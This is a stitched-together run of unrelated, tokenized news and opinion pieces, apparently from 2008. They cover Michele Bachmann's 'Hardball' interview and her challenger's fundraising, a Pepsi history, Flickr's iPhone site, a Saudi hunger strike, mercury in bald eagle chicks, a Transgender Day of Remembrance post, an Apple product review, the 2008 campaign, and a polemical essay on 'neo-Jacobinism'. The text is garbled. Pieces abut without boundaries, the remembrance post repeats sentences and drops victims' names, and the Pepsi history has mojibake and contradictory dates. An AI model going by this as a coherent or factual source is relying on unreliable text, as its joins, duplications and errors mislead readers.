“ It ’s an excellent fundraising tool , ” she added , citing research indicating that “ when you show someone a video online , they donate 10 % more . ”
Bachmann ’s interview has turned the race into one of the country ’s most intensely watched .
It also unleashed an online backlash against Bachmann , who many local political observers assumed would easily win reelection .
President Bush won the district in 2004 with 57 % of the vote .
In 2006 , former state Sen . Bachmann was heralded as the first female Republican to be elected to the U.S. House of Representatives from the district , which is dominated by blue - collar and farming communities .
And this summer , one of the few polls conducted in the race showed that Bachmann held a 13 - point lead over Tinklenberg .

But on Wednesday , the National Republican Congressional Committee pulled all of its TV advertising supporting Bachmann in the 6th District , according to a GOP source .
Since her “ Hardball ” appearance , Bachmann ’s lawn signs have been vandalized .
Callers spew profanity at volunteers and obscenities about the congresswoman at her district campaign office .
Bachmann has retreated from her statements at nearly every campaign stop .
She blamed the brouhaha on falling into a “ trap ” she said Matthews laid for her , and on having her words twisted by bloggers .
“ This has been a game of telephone gone into overdrive -- nothing more , ” said Bachmann spokeswoman Michelle Marston .
“ A week ago , our competitor had no name identification .
If they think that they ’ll win by throwing a million dollars ’ worth of mud , I can tell you right now it wo n’t be enough . ”
Marston said Bachmann ’s campaign also had seen a jump in contributions , from sympathetic donors who feel she ’s being unfairly targeted .
But Marston said she did n’t know the specific amount .

At the time Bachmann was on “ Hardball , ” Tinklenberg was watching a college hockey game and stumping for votes in the bleachers .
The cheers drowned out the sound of his cellphone ringing .
“ By the time I looked at it , my voice mail was full , ” said Tinklenberg , 58 , who served as Gov. Jesse Ventura ’s transportation commissioner from 1999 to 2002 and now works as a transportation consultant .
“ It was family , friends , neighbors , supporters , ” Tinklenberg said .
“ Everyone was asking , ‘ Did you see what she said ? ’ ”
Since then , the campaign -- whose eight staff members had gone Dumpster - diving for office furniture and the wire wickets used for lawn signs -- has become flush .

The majority of the funds have come electronically .
Of the more than 20,000 online donations , 3,210 came from Minnesota .
An additional 2,405 people donated from California , and 2,330 from Texas .
Thousands of people have called the campaign office , offering up their credit card numbers .
Some gave the maximum $ 2,300 , but most offered far smaller amounts , $ 3 or $ 5 , along with a message of support and an apology for not being able to give more .
“ I ’m a registered Republican and I have never made contributions to political campaigns , ” wrote one 66 - year - old donor .
“ I wish I could send more . ”
In a greeting card with a fuzzy white kitten on the front , another donor wrote , “ What your opponent said on Chris Matthews was sickening !
Hope you can defeat her ! ”
People who said they could n’t afford to give cash have been dropping off food for Tinklenberg and the staff -- platters of apple strudel , pots of chicken noodle soup , paper bags stuffed with cookies .
Advertisement
Now , Tinklenberg said , the campaign is trying to find ways to spend so much money in so little time , so he can get out his message on ways to attract jobs , improve public infrastructure and expand public transportation options .
His staff is frantically contacting local TV and radio stations to snap up available advertisement spots , installing more phone lines and placing orders for stacks of boxes of campaign literature .
“ I ’m not happy she said what she said , ” Tinklenberg said .
“ But we certainly are benefiting from it . ”

In Rep. Bachmann ’s own words
What Rep. Michele Bachmann said Friday on MSNBC ’s “ Hardball with Chris Matthews ” :
Matthews : “ You believe Barack Obama may have anti-American views ?
You ’re suspicious he has anti-American views ? ”
Bachmann : “ Absolutely .
Absolutely .
I ’m very concerned that he may have anti-American views .
That ’s what the American people are concerned about .
That ’s why they want to know what his answers are . ”
Advertisement
Later in the interview :
Matthews :
How many congresspeople are in the anti-American crowd you describe ?
Bachmann :
You ’d have to ask them , Chris .
I ’m focusing on Barack Obama and the people that he ’s been associating with .
Matthews : [ Repeats question ]
Advertisement
Bachmann :
What I would say is that the news media should do a penetrating expose and take a look .
I wish they would .
I wish the American media would take a great look at the views of the people in Congress and find out :
Are they pro-America or anti-America ?
I think people would love to see an expose like that . ”
ADDENDUM
In a speech Tuesday to the St. Cloud , Minn. , Rotary Club , Bachmann said she would like to “ take back ” her words .
“ I did not say that Barack Obama was anti-American , nor do I believe Barack Obama is anti-American .
He loves his country , just as everyone in this room does , ” she said .
“ Nor did I call for an investigation of members of Congress for their pro-American or anti-American views .
That is not what I said . ”

Bachmann told the St. Cloud Times on Tuesday that she “ made a big mistake ” by going on “ Hardball . ”
She said she did not bring up the term “ anti-American . ”
Still , she said , “ I should not have used that phrase . ”

Pepsi-Cola is the world ’s most famous # 2 multi-billion dollar brand .
We ’ve prepared a short history , hope you ’ll like it .
PepsiвЂ™s drink history starts from the old - old ancient times .
It was invented by a pharmacist Caleb Bradham in the summer of 1893 and was initially named “ Brad ’s drink ” while in 1898 after the pepsin and cola nuts were used in the recipe it was renamed to Pepsi Cola .
In 1903 the “ Pep Cola ” brand name was trademarked .
Brad вЂ™s neighbor designed the first Pepsi logo and ninety - seven shares of stock for Bradham ’s new company were issued .
In 1903 , Bradham moved the bottling of Pepsi-Cola from his drugstore into a rented warehouse .
That year , Bradham sold 7,968 gallons of syrup .
The next year , Pepsi was sold in six - ounce bottles , and sales increased to 19,848 gallons .
In 1924 , Pepsi received its first logo redesign and 1926 , the logo was changed again .
Seventeen years of success and Caleb Bradham lost the company : Pepsi Cola went bankrupt in 1923 .
In 1928 Roy C. Megargel reorganizes the firm as the National Pepsi-Cola Company .
In 1931 the company goes bankrupt again and same year it вЂ™s being bought by the Loft Candy Company whose president Guth v. Loft reformulated the popular soft drink and even offered to sell Pepsi to the Coca - Cola company , but they refused to offer a bid .
The year 1936 was a real success .
“ Nickel Nickel ” jingle advertisement for Pepsi Cola that referred to the price of Pepsi and the quantity for that price became a hit record that was recorded into fifty - five languages .
Here вЂ™s the jingle : “ Pepsi cola hits the spot / Twelve full ounces , that ’s a lot / Twice as much for a nickel , too / Pepsi-Cola is the drink for you вЂќ. In 1936 alone 500,000,000 bottles of Pepsi were consumed .
From 1936 to 1938 , Pepsi -Cola ’s profits doubled .
Twelve - ounce Pepsi cans are being invented .
Walter Mack was named the new President of Pepsi-Cola and guided the company through the 1940s .
He was the one who noticed that the company ’s strategy of using advertising for a general audience either ignored African Americans or used ethnic stereotypes in portraying blacks .
He realized African Americans were an untapped niche market and that Pepsi stood to gain market share by targeting its advertising directly towards them .
After Mack left the company in 1950 , support for the black sales team faded and it was cut .
In 1964 Pepsi Cola presented their Diet Pepsi to the public .
The year of 1975 is famous for the Pepsi Challenge marketing campaign where PepsiCo set up a blind tasting between Pepsi-Cola and rival Coca - Cola .
During these blind taste tests the majority of participants picked Pepsi as the better tasting of the two soft drinks .
1982 – Pepsi Free , a caffeine - free cola , is introduced nationwide
1993 - в ЂњSearch for Michael JacksonвЂќ
In 1996 , PepsiCo launched the highly successful Pepsi Stuff marketing strategy .
It was featuring merchandise that could be purchased with Pepsi Points .

Flickr has launched a new iPhone - optimized version of its site , and it looks fantastic .
As you can see in the screenshots , the most used options run along the top of the page and , although there does n't appear to be any AJAX-y cacheing going on , the individual pages load at a fair clip .
You can do anything of the viewing you can do on the normal Flickr , although the bite - sized version does n't offer any editing of pictures – the Organizr , for instance , is n't there .
But then , it should n't be .
It would have meant a complete rewrite of the Flash based interface for little gain – who wants to edit on the tiny iPhone screen anyway ?
What Flickr has done is take the essential search and viewing tools and made them small , slimline and fast .
I 'm testing the site out in an internet cafe ( thanks for blowing up my home connection , Telefónica ) , and – apart from a problem loading photographs in my sets – the site has almost no delay .
Fans of slideshows will be disappointed , though .
There are n't any .
For that you 'll need a standalone iPhone application Like Fraser Speirs ' Exposure .
Sadly , Yahoo's experimental AJAX - based Flickr site for the iPhone , which offered slideshows , seems to have been taken down .

As hunger strikes go , the 48 - hour fast that Fowzan Mohsin al - Harbi and 39 other Saudis plan to stage this week is not likely to have a dramatic outcome .
Rather , says the mechanical engineer , the rare public protest is meant to make a statement about the prolonged detention of 11 men who had called for political reforms in this country .
" It 's just a symbol to [ draw ] attention to our case , " says Mr. Harbi , who works at King Abdul Aziz City for Science and Technology in Riyadh .
" Yeah , I 'm afraid , " he adds .
" But what can we do ?
We have to ask for our rights ....
We have to move , like every people in the world . "
In a sense , the hunger strike is a " virtual " protest .
Organizers are publicizing it on Facebook.com and their own website .
Word is also being spread by several Saudi bloggers .
This online communication is key since the participants plan to refrain from all food and drink in their own homes Thursday and Friday , the weekend here , so as to avoid violating a ban on unauthorized assemblies .
" If we get in one place , we might get in trouble , " says Mohammad Fahd al - Qahtani , a professor of economics who also hosts a local television program .
" It 's the first time that activists are doing something like this , " Mr. Qahtani says of the online publicity .
" Now we are using new tactics . "
The protest , said to be the first of its kind in recent memory , tests the boundaries of what is permissible in Saudi Arabia , an absolute monarchy that forbids political parties and rallies .
Under King Abdullah bin Abdul Aziz , Saudis have been allowed to openly discuss reforms in such areas as education , women 's rights , labor rules , economics , and domestic abuse .
But there is little tolerance for political dissent , and harsh criticism of officials is often severely punished .
Interior Ministry spokesman Gen. Mansour Turki declined to comment , saying that he was unaware of the hunger strike and did not have information on the 11 detainees ' current status .
Similarly , a spokesman for the government - appointed Human Rights Commission said he could not comment .
" We can't comment on anything we do n't know anything about , " says Zuhair al - Harithy .
Perhaps the best - known of the 11 detainees is Matrouq al - Faleh , who was arrested in his office at Riyadh 's King Saud University , where he teaches political science , in May .
His arrest came two days after he published a scathing online report about prison conditions .
The other detainees include a human rights activist detained in December , and nine residents of Jeddah arrested in February 2007 .
The Interior Ministry has suggested that the men were involved in illicit funding of militant networks .
But they have not been publicly charged .
Most of the Jeddah detainees were known for their advocacy of political reforms .
Human Rights Commission spokesman Mr. Harithy says the Commission has spoken to the Interior Ministry about the detainees , and " were promised the cases will be solved soon . "
Christoph Wilcke , who follows Saudi events for the New York - based Human Rights Watch , said in an e-mail that the protest is a " potent sign " of failure by the Saudi judicial system .
" The Jeddah group of reformers and Matrouq al - Faleh have been arrested for their public and private calls for reform , " he says .
" But the law and the courts have failed to protect their human right to peacefully express their opinions . "
The strikers include friends and relatives of the detainees , as well as Saudis with a general concern about human rights .
In an online statement , they said their demands were simple : " Set the detainees free or instantly grant them fair and public trials . "
Less than two years after the bald eagle was removed from the federal government ’s endangered species list , an environmental organization in Maine has found an alarming accumulation of mercury in the blood and feathers of bald eagle chicks in the Catskill Park region of New York .
The levels are close to those associated with reproductive problems in common loons and bald eagles elsewhere in the Northeast , although the New York and national populations of bald eagles have been growing strongly in recent years .
The study is being released Tuesday by the BioDiversity Research Institute , a nonprofit ecological organization in Gorham , Me .
The average mercury blood level in chicks within the parks ’ boundaries was 0.64 parts per million .
The same study showed that about one - quarter of the feathers of adult birds also had elevated levels of mercury , suggesting that the toxin builds up in the raptors faster than they can get rid of it .
Trans people are often targeted for violence because their gender presentation , appearance and / or anatomy falls outside the norms of what is considered acceptable for a woman or man .
A large percentage of trans people who are killed are prostitutes , and their murders often go unreported or underreported due to the public presumption that those engaged in sex work are not deserving of attention or somehow had it coming to them .
Some trans people are killed as the result of being denied medical services specifically because of their trans status , for example , Tyra Hunter , a transsexual woman who died in 1995 after being in a car accident .
EMTs who arrived on the scene stopped providing her with medical care — and instead laughed and made slurs at her — upon discovering that she had male genitals .
Lacking federal employment protections , transgender men and women are at higher risk for lack of insurance , adding to the difficulty of securing routine medical care from welcoming practitioners .
Transmen in particular can have trouble locating accommodating gynecological services for annual pap smears , risking undiagnosed cervical cancer .

That 's the kind of hate crime that does n't make headlines .
Or even federal hate crimes statistics .

On August 18 , 2008 a Philadelphia judge acquitted Terron Oates of murdering of Alexis King and instead convicted him of voluntary manslaughter , apparently accepting his " trans panic " defense , i.e. he was provoked by discovering that King was biologically male ( even though the area he picked up King was a known district for transsexual prostitutes ) .
Oates defense attorney argued that King was shot while fighting Oates for his gun -- even though she was shot in the back and side .
The lesser charge meant Oates could be release after only 30 days because of credit for time served .
Also , in Yuma , AZ the killer of Amancio Morales plea bargained down an attempted manslaughter charge .
Morales , was a 23 - year - old female impersonator , who was dressed in as a women when he was killed by what police called " violent trauma " from numerous stab wounds and was found floating in the river .
Court records said Morales killer became enraged when he realized the Morales was biologically male .
Also , a number trans people were attacked in apparent hate crimes , including : an unnamed " man dressed as a woman " in Miami was the victim of a drive - by shooting on Sept. 29 .
He survive the attack ; in Sacramento on May 27 , a man described by police as a skinhead attacked two transgender homeless people , stabbing one of them .
Finally , while this is the Transgender Day of Remembrance , let us also remember our LGB brothers and sisters who have been beaten and killed during the past year .
Indeed .
We remember all the victims of violence and apathy today .
The rest of the year , I 'll continue to advocate on behalf of my trans sisters and brothers , I 'll continue to pay attention , I 'll continue to challenge the gender norms deviation from which feeds into violent transphobia , I 'll stand with you

Julia Serano , a trans activist and author of Whipping Girl : A Transsexual Woman on Sexism and the Scapegoating of Femininity , noted , in a post at Feministing last year , that transphobia kills not just by violent action , but apathetic inaction .
Lacking federal employment protections , transgender men and women are at higher risk for lack of insurance , adding to the difficulty of securing routine medical care from welcoming practitioners .
Transmen in particular can have trouble locating accommodating gynecological services for annual pap smears , risking undiagnosed cervical cancer .
The great 2001 documentary Southern Comfort spans the last year in the life of Robert Eads , an FTM transsexual who died of ovarian cancer after two dozen doctors refused him treatment .
That 's the kind of hate crime that does n't make headlines .
Or even federal hate crimes statistics .
Shaker Lena also emails , as I was writing this post : Indeed .

The rest of the year , I 'll continue to advocate on behalf of my trans sisters and brothers , I 'll continue to pay attention , I 'll continue to challenge the gender norms deviation from which feeds into violent transphobia , I 'll stand with you fiercely , my friends .

And brothers .
Today marks the 10th Annual Transgender Day of Remembrance , which is set aside to memorialize those killed as a result of anti-transgender hatred or prejudice resulting from fear and ignorance .
The event is held in November to honor Rita Hester , whose murder on November 28th , 1998 spawned the " Remembering Our Dead " online project and candlelight vigil .
This year , we remember of Thornton Heath , UK , of Cincinnati , of Santiago , Chile , of Albuquerque , of Baltimore , of Charleston , of Kota Kinabalu , Malaysia , of Detroit , of the Bronx , of Oxnard , CA , of Fort Lauderdale , of Lisbon , Portugal , of West Palm Beach , of Porta Vallarta , Mexico , of Hamburg , Germany , of Memphis , of Sevilla , Spain , Aucalle Coronel of Lombardi , Italy , of Greeley , CO , of Makiki Honolulu , HI , of Milan , Italy , of Louisville , of Sacramento , of Aurora , CO , of Memphis , of Ankara , Turkey , of Syracuse , of Iraq , and all the other trans women and men around the world who lost their lives to transphobia this year , whose faces we never saw and names we never heard , because they were living on the margins of societies who did not respect nor want them .
Report Card , Part Three
When the original Apple Macintosh debuted in 1984 , it carried a $ 2,495 price tag - roughly $ 5,250 in 2008 money .
Ever since , the debate has raged over whether Macs are more expensive , feature - by - feature and capability - by - capability , than their PC brethren .
And what a meaningless debate it is .
Here at The Reg , we subscribe to two time - honored dictums : " You get what you pay for , " and " You pays your money and you makes your choice . "
By and large , Apple produces solid , reliable hardware , much of it bundled with a broad range of user - friendly software .
If you want Apple , you buy Apple and you pay Apple 's price .
No one 's forcing you to .
On January 24 , 1984 , when Steve Jobs unleashed the Macintosh at an Apple shareholders meeting ( click here for video ) , no one cheered when he announced its un-LISA - like " mainstream price point . "
They cheered when he pulled it from a carrying case and it said " Hello , I'm Macintosh .
It sure is great to get out of that bag . "
With the inevitable January 24 , 2009 just around the corner , we 're handing Jobs and crew their 25 - year report card .
Just because we can .
We 've already served up Parts One and Two , rating and slating everything from Apple 's innovation mojo to its ( non-existent ) philanthropic efforts .
Now , we rate the products themselves .
But we wo n't mention the price of a PC .
Sons of Macintosh
Since Steve Jobs first pulled the original Mac out of its carrying case , there have been just under 300 different Mac models .
Today , there are nine - not counting variations in processor power , graphics subsystems , and the like .
The desktop line includes the Mac mini , the 20 - inch and 24 - inch iMacs , and the Mac Pro .
On your lap , there are a pair of MacBooks , plus two different - sized MacBook Pros and the featherweight MacBook Air .
Well , " on your lap " might be a wee bit overstated , since Apple 's laptops have such toasty bottoms that it 's not wise to get them too close to your naughty bits .
Most Macs are , in general , closed systems that are n't meant to be upgraded or customized , despite the fact that an entire third - party ecosystem exists to do just that .
Most Mac users , however , do n't exploit upgrade possibilities other than RAM - and except for the top - of - the - line Mac Pro and the hard drives of the MacBook and MacBook Pro , Apple does n't make it easy for them to do so .
That said , if you buy the right Mac , it 'll do pretty much what you want it to do right out of the box - unless you 're a devoted gamer .
Despite the fact that Apple continually tries to assert that it's got game , the truth is that no Mac can carry the jockstrap of a fully hot - rodded Windows box when it comes to PC gaming .
Let 's start at the bottom of the desktop line and work our way up .
Mac mini :
Ah , pity the poor , neglected runt of the Mac litter .
The mini ( $ 599 to $ 799 ) is the only Mac to still contain a last - generation 65nm Merom - class processor , and its innards have n't been upgraded since the middle of last year .
It 's the only Mac , for example , that 's still lumbered with 667MHz frontside bus ( FSB ) .
Rumors of the mini's impending death have yet to come true , and so it carries on in its humble duty of being the cheapest - and the cutest - way to run Mac OS X .
It 's tiny ( 2- by 6.5 - by 6.5 - inches ) , quiet , and unobtrusive .
Do remember that you 'll need to supply your own mouse , keyboard , and display .

The 2008 race for the White House that comes to an end on Tuesday fundamentally upended the way presidential campaigns are fought in this country , a legacy that has almost been lost with all the attention being paid to the battle between Senators John McCain and Barack Obama .
It has rewritten the rules on how to reach voters , raise money , organize supporters , manage the news media , track and mold public opinion , and wage  and withstand  political attacks , including many carried by blogs that did not exist four years ago .
It has challenged the consensus view of the American electoral battleground , suggesting that Democrats can at a minimum be competitive in states and regions that had long been Republican strongholds .
The size and makeup of the electorate could be changed because of efforts by Democrats to register and turn out new black , Hispanic and young voters .
This shift may have long - lasting ramifications for what the parties do to build enduring coalitions , especially if intensive and technologically - driven voter turnout programs succeed in getting more people to the polls .
Mr. McCain ’s advisers expect a record - shattering turnout of 130 million people , many being brought into the political process for the first time .

“ I think we ’ll be analyzing this election for years as a seminal , transformative race , ” said Mark McKinnon , a senior adviser to President Bush ’s campaigns in 2000 and 2004 .
“ The year campaigns leveraged the Internet in ways never imagined .
The year we went to warp speed .
The year the paradigm got turned upside down and truly became bottom up instead of top down . ”

Following Plato , many moralists have associated political virtue with a reluctance to pursue and exercise power .
To want to rule others is to be morally disqualified from doing so .
The strong tendency in traditional Western political thought to disparage a desire for power has been unfortunate .
Without some people governing others , basic social order could not exist , to say nothing of effecting desirable change .
The prejudice against power - seeking has left politics too much to people with the wrong kind of ambition , who want to rule as an end in itself .
The reason for observing that the pursuit of power need not be immoral but can be a means to good is that this article will challenge a particular manifestation of the will to power — one that finds expression in increasingly influential arguments for boosting the prerogatives of the American president and the federal government .
The criticism that will be directed here against that hankering for domination must not be misunderstood as stemming from opposition to any and all efforts to acquire power .
What will be rejected is an inordinate and blatantly partisan , and therefore perverse , craving to rule — a dream not just about taking over the U.S. government but about dominating the world .
The people who have this desire attempt to conceal its real nature by pretending that it comports well with the thinking of the framers of the U.S. Constitution .
It is in fact alien to that thinking .
Would that power of a different quality could prevail against it !
A merely self - serving desire for power cannot present itself as such .
It must portray itself as a wish to assist others .
How best to argue for giving you or your group great power ?
If you are able to persuade others that the present world is grossly oppressive and destructive of human happiness but that you can make it much better , those others may support mobilizing massive power and placing it in your hands or the hands of people like you .
The more ambitious your scheme for benevolent change , the greater the need for power .
Since the French Revolution , ideologies have been exceptionally conducive to power - seeking .
Jacobinism , Communism , and National Socialism are alike in promising glorious change and assuming the desirability of giving vast power to those who claim to know what needs to be done .
A few years ago , David Frum and Richard Perle provided an all - purpose justification for unlimited power : putting " an end to evil " — the title of their co-authored book .
Now there is a noble and ambitious goal !
Power beyond the dreams of avarice would be needed to realize it .
That rooting out evil might be an endless task only increases its appeal to a ravenous will to power .
We are , of course , supposed to believe that the connection between advocating sweeping change and needing great power is purely coincidental .
Jacobinism and Marxism were openly revolutionary .
They were the ideologies of out - groups challenging existing elites .
What this writer has called neo-Jacobinism is the ideology of people on the inside , members of America 's elites , who wish to make the military and other might of the United States a more pliant and powerful tool and who are attempting a creeping coup d'état from within .
According to their ideology , America is called by history to create a better world based on universal principles .
Virtuous American power must be unleashed .
Their main excuse at present for exercising extra-constitutional power is to combat " Terrorism , " but any threat to their great cause is a potential justification for setting the Constitution aside .
The rise of the huge , centralized Federal government and the corresponding decline of limited , decentralized government resulted from changes deep in the American mind and imagination .
The new Jacobins take advantage of the fading of the old ethos and hasten its disappearance by advocating notions incompatible with it .
The old American idea of government was indistinguishable from the commandment to " love thy neighbor . "
That morality stressed the importance of the person trying to control his own evil and weakness .
Strength of will — character — had to be built up so that the person would become capable of more loving familial and local relationships and more responsible citizenship .
This morality made for strong communities and self - reliance and minimized the need for government .
Alexis de Tocqueville pointed to the great reluctance among Americans in the early 19th century to give up power over their own lives to any distant authority .
The Constitution rested on an unwritten constitution , which was America 's religious , moral , intellectual , cultural , and social habits and beliefs .
Traditional America encouraged a strong attachment to life lived up - close .
It fostered self - restraint , modesty , respect for law , and a willingness to compromise .
It was this heritage that brought into being the constitutional personality .
Just as people were in the habit of imposing internal checks on desire , so were they predisposed to accept and respect external constitutional and other legal constraints .
Without such people , the Constitution could not work as intended .
But the self - understanding of Americans slowly changed .
Throughout the Western world a very different moral ethos was spreading that shifted attention away from intimate associations and local community .
It rejected the old notion of original sin and of personal responsibility for people up close .
It found morality not in acts of character toward particular individuals — neighbors — but in " idealistic , " sentimental caring for unfortunate collectives and mankind at large .
The older personality , which the Constitution both assumed and required , began to wither .
Americans started to abdicate authority to benevolent - sounding politicians far away .
Increasingly , doing good became perceived as the responsibility of government , which alone could take on the large projects now said to be demanded by morality .
Governmental , collective action gradually replaced individual , private and communal responsibility .
The moral momentum behind the old decentralized society weakened .
Today strong , centralized Federal power seems to more and more Americans not merely acceptable but desirable .
This is so because they are absorbing the anti-traditional moral sensibility now dominant not only in the universities , the arts , the news media , and the entertainment and publishing industries but in many churches .
Hence Americans say increasingly to government : " Act for us ! "
Much of the intellectual opposition to this trend has been confused and self - defeating .
A prime example is the way many conservatives , thinking that they were shoring up traditional beliefs , attached themselves to the ideas of Leo Strauss ( 1899 1973 ) , whose disciples became a major force in American academia and national politics .
A refugee from Nazi Germany , Strauss taught for many years at the University of Chicago .
Because he appeared to defend a classical , ancient notion of universal moral right , many did not notice that he was actually discrediting respect for tradition .
Strauss and his disciples advocated an anti-historical , un- conservative notion of moral universality .
According to Strauss , no real philosopher gives any credence to " the conventional " or " the ancestral , " to use his terms .
To respect them represents the greatest of all intellectual sins , " historicism . "
Inherited ways are , he insisted , mere accidents of history .
Respect is owed solely to " the simply right , " which is ahistorical and rational .
Strauss sharply criticized Edmund Burke , who saw the possibility of moral universality acquiring historical form .
Strauss 's abstract notion of natural right ruled out the idea that a particular tradition might , despite inevitable flaws , embody the quest for moral universality and be , for that reason , worthy of allegiance .
Strauss 's ideas were blithely absorbed by many Christians , not least philosophically unsophisticated and nave Roman Catholics , who perceived him as a defender of moral right .
They did not realize that his conception of universality was markedly different from that of Christianity and related philosophical currents .
They did not understand or care that in rejecting tradition as a proper source of guidance Strauss was attacking one of the pillars of their faith .
They did not comprehend that by sharply separating the universal from the particular Strauss ruled out universality becoming selectively incarnate in history and was striking at the very core of their professed beliefs .
Specifically , he was denying the possibility of the Incarnation , of the Word becoming flesh .
Straussian political philosophy has sought to detach Americans from their historically existing tradition of constitutionalism with its deep and distinctive roots in history and to make them loyal instead to abstract principles of Straussian design that have been attributed to the founders .
Straussians are not all alike — in a few , the anti-historical prejudice is diluted to some extent by respect for America 's actual past — but prominent disciples of Strauss such as Allan Bloom , Harry Jaffa , and Walter Berns , who differ in some ways , all agree that what is admirable about America is not its concrete , historical self but the abstract principles of the founders .
In the last few decades , Straussian conceptions of Americanism , patriotism and virtue have been widely advocated in academia , including America 's military academies .
That terms like these can be given a distinctly anti-traditional meaning has been little noticed .
By propagating a rationalistic , anti-historical notion of moral right Strauss and his disciples have created a deep prejudice against cherishing America 's distinctive , historically evolved Christian and British past .
But this was the cultural heritage that nurtured the inner and outer restraints of American constitutionalism .
Because Straussian anti-traditionalism has confused and weakened so many who wanted to defend that heritage , it has been in some ways more destructive of it than standard liberal anti-traditionalism .
Despite plentiful ceremonial praise for the Constitution and virtual orgies of constitutional legalism , we are living through the progressive dismantling of America 's proudest political achievement .
One sign of the precarious condition of the Constitution is that many imagine that it could be restored by electing more politicians sympathetic to its tenets and by having more " strict constructionists " appointed to the U.S. Supreme Court .
But the old American constitutionalism is inseparable from the moral - spiritual and other culture that gave it birth .
Limited government and liberty were made possible by people who , because of who they were , put checks on their appetites , ran their own lives and communities , and behaved more generally in ways conducive to freedom under law .
Restoring American constitutionalism would presuppose some kind of resurgence of that old culture .
Americans would have to begin viewing life rather differently from how they are viewing it now .
They would have to rearrange their priorities and start acting differently , placing more emphasis on family , private groups and local communities .
They would have to want to take back much of the power ceded to politicians .
Is that likely to happen ?
If not , the Constitution may not be salvageable .
The time has certainly come to consider what might take the place of American constitutionalism .
That so many admirers of the old Constitution are prone to nostalgic dreaming and elaborate defenses of what is long gone is a sign of moral and intellectual paralysis .
But there are people who have thought for a rather long time about what should replace the Constitution of 1789 .
They include leading Straussians and neoconservatives who have masked their agenda by pretending to defend what is being lost .
It is only fair to add that the strategic designs of secretive and obfuscating leaders are not always obvious to the rank and file .
Straussians and neoconservatives have warned against the consequences of abandoning America 's " founding principles , " but they are not referring to the ways and beliefs of the founders but to abstractions of their own devising that they falsely attribute to revered historical figures .
Those principles are more reminiscent of the French Jacobins than of the founders .
Straussians and neoconservatives have also warned of the consequences of the " closing of the American mind " — the title of Allan Bloom 's 1987 best - selling book — but the mind that they want kept open is not the old American mind but what they would have preferred it to be , their own version of the Enlightenment mind .
The same people have warned of American cultural decline , as measured some years back by William Bennett 's " cultural indicators , " but what they want is not the old American virtues of neighborliness , localism , self - control , compromise , and the rule of law , but the purported virtue of vigorously asserting universal principles in the world .
The new Jacobins disdain moral hesitation and ambiguity , demanding what they call " moral clarity . "
You are either on the side of good , spreading " democracy " or " freedom , " as they understand them , or you are siding with the enemy .
The new Jacobins have a double message .
On the one hand , they tell Americans that their society is in great danger :
It is threatened domestically by fragmentation caused by lack of virtue and patriotism , by moral nihilism , historicism , and multiculturalism .
It is threatened from abroad by Terrorism and " Islamofascism . "
But , on the other hand , the new Jacobins want to be reassuring :
Be not afraid !
We , the patriotic champions of American principles , are here to protect you !
We promise you order and security and an America committed to right in the world .
Their notion of America reveals its alien origins even in strange - sounding language , as in the name " Department of Homeland Security . "
They are popularizing un -American ideas of governance , notably the so - called " unitary " executive — the notion of the preeminence of the president , who is to be as little constrained as possible by checks and balances and the rule of law .
Their goal is wholly at odds with the constitutionalism of the framers .
Lest too many worry about the expansion and centralization of federal power , the neo -Jacobins do not let Americans forget even for a day the great and acute danger of Terrorism .
A country that spends almost as much on its military and national security as the rest of the world put together has to tremble continuously before possible threats .
People who resist the progressive erosion of American liberties are portrayed as unpatriotic and a threat to national security .
Those who would protect us are advancing the coup from within by teaching us to associate American security and virtue with the leadership of a strong man .
Here , as in other ways , Straussian and neoconservative ideas have blended with and hardened standard liberal thinking .
In the mid-20th century it was academics like James MacGregor Burns who inspired a cult of the presidency .
Burns , who eventually became president of the American Political Science Association , was the quintessential modern American liberal .
He advocated popular rule through strong presidential leadership in the Roosevelt - New Deal mode .
He knew well that this notion flatly contradicted the framers .
They opposed " democracy " and assumed that if any branch of the U.S. government were preeminent , it would be the Congress .
Now it is Straussians and neoconservatives who most extol strong executive leadership and more generally muscular federal government .
They see the powers of the executive as trumping the powers of the other branches , especially at a time of national emergency .
Then the president must embody and express the will of the nation as he sees fit .
Harvard 's Harvey Mansfield is the intellectual figurehead of those attempting to justify the creeping coup from within .
In The Wall Street Journal ( May 2 , 2007 ) he has stressed that , now more than ever , America needs a " strong executive . "
Basing his argument on a strained and transparently unhistorical interpretation of the framers , he contends that the rule of law has drawbacks , " each of which suggests the need for one - man - rule . "
For one thing , the law can produce only what is mediocre , " an average solution even in the best case . "
For another , the law lacks " energy . "
In a crisis , government must put forth " energy , " and " the best source of energy " is " one man . "
What America needs today , Mansfield declares , is " a wise man on the spot " with freedom to act for the whole .
To " subordinate " the president to law and the legislature is " dangerous . "
Then " he could not do his job . "
Not only is a strong executive needed to deal with emergencies , Mansfield contends .
It must also be able to overpower domestic opposition , " oppose a majority faction produced by temporary delusions in the people . "
Americans admire strong presidents not just in politics but also in corporations , he argues .
If it is suggested that there is a connection between a strong executive and imperialism , Mansfield regards it as better to err on the side of imperialism than isolationism .
The difficulties of the war in Iraq arose , he writes , " from having wished to leave too much to the Iraqis , thus from a sense of inhibition rather than imperial ambition . "
It seems apposite that Mansfield , the advocate of muscular executive power capable of enforcing its will at home and abroad , should also be a champion of what he calls " manliness , " the topic of his recent book .
The many proponents of the theory of the " unitary " executive include John Yoo , now a professor of law at the University of California , Berkeley .
As a Justice Department lawyer in the Bush administration , Yoo , formerly at the American Enterprise Institute , famously defended broadly discretionary presidential power and the use of torture in the war against terrorism .
Michael Goldfarb , previously at the Weekly Standard and now deputy communications director for the McCain for president campaign , has asserted that the framers " sought an energetic executive with near dictatorial power in pursuing foreign policy and war . "
Voices calling for unleashing allegedly virtuous American power have long been heard in the electronic media , the major newspapers — Washington Post and New York Times prominent among them — the big news magazines , and the leading opinion periodicals .
Long before 9/11 Charles Krauthammer wrote in the Washington Post that America must take advantage of being the only superpower to create a world to its liking .
How should it accomplish this goal ?
" By unapologetic and implacable demonstrations of will " ( March 5 , 2001 ) .
Why should virtuous America not be " implacable " ?
Robert Kagan wrote in the same newspaper that " America . . . can sometimes seem like a bully on the world stage . "
" But really , the 1,200 - pound gorilla is an underachiever in the bullying business " ( November 3 , 2002 ) .
The handwriting is all over the wall .
It is becoming clearer with each passing day that neo -Jacobinism and related currents , which may have seemed innocuous and " merely academic " to some , have provided ideological cover for an ever more grasping and ruthless pursuit of power .
People of great ambition who want to exercise the power being abdicated by Americans are trying to make us accept and even welcome the final disappearance of American constitutionalism and its culture of modesty and self - restraint .
As already mentioned , some earlier assaults on traditional Western civilization were launched by openly radical agitators who saw themselves as on the outside of their societies .
Their justifications for seizing power were revolutionary doctrines like those of Marx and Trotsky .
Today 's rolling , gradual coup is engineered by already powerful people who want to consolidate and expand their power .
